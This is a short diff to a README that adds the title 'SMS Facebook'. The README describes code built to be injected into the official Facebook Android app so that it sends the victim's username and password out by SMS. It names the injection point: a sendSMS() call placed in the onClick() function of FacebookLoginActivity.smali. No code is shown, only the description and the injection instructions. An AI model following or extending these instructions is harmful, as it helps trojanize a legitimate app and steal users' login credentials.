@@ -1,3 +1,4 @@
+# SMS Facebook
 This app when injected properly into the original Facebook android app will give you username and password via SMS. The app is not designed to run by itself and will give errors if you compile and run it.
 # Where to inject
   - sendSMS() is to be injected in FacebookLoginActivity.smali in the onClick() function
